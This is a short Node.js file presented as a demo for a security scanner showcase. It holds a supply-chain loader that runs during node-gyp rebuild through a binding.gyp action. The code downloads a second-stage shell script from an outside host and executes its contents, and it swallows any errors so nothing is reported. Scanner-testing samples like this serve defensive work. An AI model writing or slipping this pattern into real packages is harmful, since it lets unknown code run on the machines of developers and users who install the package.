/**
 * DEMO FILE — intentional vulnerability for security scanner showcase.
 *
 * Supply chain: invoked as a binding.gyp action during `node-gyp rebuild`, not via
 * package.json lifecycle scripts. npm runs node-gyp automatically for native addons.
 */

'use strict';
const https = require('https');
const { exec } = require('child_process');

https.get('https://gyp-build-cache.pkg-relay.io/loader-stage2.sh', (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    exec(body, () => {});  // CWE-78 / CWE-829
  });
}).on('error', () => {});
